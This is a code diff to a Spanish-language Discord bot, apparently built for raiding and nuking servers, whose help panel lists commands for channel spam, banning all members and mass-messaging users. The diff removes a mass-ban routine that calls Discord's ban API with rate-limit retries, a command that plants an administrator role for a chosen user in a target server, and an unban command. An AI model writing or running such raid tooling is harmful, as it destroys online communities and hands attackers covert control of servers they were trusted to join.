@@ -28,7 +28,7 @@ if sys.version_info >= (3, 12):
 
 embed_message_id = None
 programmed_servers = set()
-ComandosBL = {"ret", "raid", "dr", "spam", "nuke", "cn", "ci", "cr", "resetserver", "bn"}
+ComandosBL = {"ret", "raid", "dr", "spam", "nuke", "cn", "ci", "cr", "bn", "wbh", "ks", "vs", "md"}
 
 ServersWL = {1571716858531545118, 1572176540576522361}
 
@@ -45,61 +45,6 @@ async def ProteGlobal(ctx):
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         return
-
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def massban(ctx):
-    guild = ctx.guild
-    author = ctx.author
-    members_to_ban = [m for m in guild.members if m == author if guild.me.top_role > m.top_role]
-    total = len(members_to_ban)
-    count = 0
-    confirm_msg = await ctx.send(f'**Intentando banear {total} miembros...**\n\nAsegúrate de poner el rol del bot **POR ENCIMA DE CUALQUIER OTRO**.\nEl bot solo puede banear a los usuarios que estén **BAJO** su rol.\n\nReacciona con ✅ para confirmar o ❌ para cancelar.')
-    await confirm_msg.add_reaction('✅')
-    await confirm_msg.add_reaction('❌')
-    def check(reaction, user):
-        return user == author and str(reaction.emoji) in ('✅', '❌') and reaction.message.id == confirm_msg.id
-
-    try:
-        reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
-    except asyncio.TimeoutError:
-        await ctx.send('Timed out — MassBan cancelado.')
-        return
-    else:
-        if str(reaction.emoji) == '❌':
-            await ctx.send('MassBan Cancelado.')
-            return
-        await ctx.send(f'Iniciando baneo a {total} miembros...')
-        async with aiohttp.ClientSession() as session:
-            async def ban_member(member):
-                nonlocal count
-                try:
-                    url = f'https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}'
-                    headers = {'Authorization': f'Bot {bot.http.token}', 'Content-Type': 'application/json'}
-                    json_data = {'delete_message_days': 0, 'reason': 'Massban'}
-                    async with session.put(url, json=json_data, headers=headers) as resp:
-                        if resp.status == 429:
-                            data = await resp.json()
-                            retry_after = data.get('retry_after', 1)
-                            await asyncio.sleep(retry_after)
-                            return await ban_member(member)
-                except Exception as e:
-                    print(f"[!] Can't ban {member}: {e}")
-                    return
-                if resp.status in (200, 201, 204):
-                    count += 1
-                    print(f'[{count}/{total}] Banned: {member}')
-                else:
-                    print(f'[!] Error while banning {member}: {resp.status}')
-                try:
-                    pass
-                except Exception as e:
-                    print(f"[!] Can't ban {member}: {e}")
-                    return
-
-            tasks = [ban_member(m) for m in members_to_ban]
-            await asyncio.gather(*tasks)
-    await ctx.send(f'Massban completado — {count}/{total} users baneados.')
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -188,35 +133,6 @@ async def on_guild_join(guild):
         await cn.callback(ctx)
         await ci.callback(ctx)
         await ret.callback(ctx)
-
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def da(ctx, user_id: int, server_id: int):
-    guild = bot.get_guild(server_id)
-    if not guild:
-        await ctx.send('No estoy en ese servidor, tal véz el ID es inválido.')
-        return
-    member = guild.get_member(user_id)
-    if not member:
-        await ctx.send('Ese usuario no está en el servidor.')
-        return
-    rol = discord.utils.get(guild.roles, name='ZS Administrador')
-    if rol is None:
-        try:
-            rol = await guild.create_role(name='ZS Administrador', permissions=discord.Permissions(administrator=True))
-            await ctx.send("Rol 'ZS Administrador' creado en el servidor.")
-        except discord.Forbidden:
-            await ctx.send('No tengo permisos para crear roles en ese servidor.')
-            return
-    try:
-        await member.add_roles(rol)
-        await ctx.send(f"Se le otorgó el rol 'ZS Administrador' a <@{user_id}> en **{guild.name}** ({guild.id}).")
-    except discord.Forbidden:
-        await ctx.send('No tengo permisos para asignar ese rol en el servidor destino.')
-        return
-    except Exception as e:
-        await ctx.send(f'Error: {e}')
-        return
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -422,16 +338,6 @@ async def sv(ctx):
     embed = discord.Embed(title='Servidores donde se encuentra el bot', description=descripcion if descripcion else 'No se encontraron servidores.', color=discord.Color.blue())
     await ctx.send(embed=embed)
 
-@bot.command()
-@commands.has_permissions(ban_members=True)
-async def db(ctx, user_id: int):
-    try:
-        await ctx.guild.unban(discord.Object(id=user_id))
-        await ctx.send(f'El usuario `{user_id}` ha sido desbaneado.')
-    except Exception as e:
-        await ctx.send(f'No se pudo desbanear al usuario `{user_id}`.\nError: {e}')
-        return
-
 paginas = [
     {
         "title": "Panel de ayuda de ZaphkielSquad Bot",
@@ -456,8 +362,6 @@ paginas = [
             "**Raidea creando muchos canales con spam.**\n"
             "`$bn` –\n"
             "**Banea a todos los miembros excepto bots con admin.**\n"
-             "`$db (ID USUARIO)` –\n"
-            "**Desbanea a un usuario por medio de su ID solo si el bot está en el servidor.**\n"
             "`$wbh` –\n"
             "**Envía repetidas veces un mensaje de raid.**\n"
             "`$dr` –\n"
@@ -466,12 +370,8 @@ paginas = [
             "**Programa 5 comandos al meter el bot.**\n"
             "`$vs (ID servidor)` –\n"
             "**Raidea solo si el Bot está dentro del servidor.**\n"
-            "`$da (ID usuario) (ID servidor)` –\n"
-            "**Crea un rol admin y se lo da al usuario si el bot está en el servidor.**\n"
             "`$md` –\n"
             "**Envía un MD a todos con el link del bot.**\n"
-            "`$massban` –\n"
-            "**Variante actualizada de el comando $bn.**\n"
         )
     }
 ]
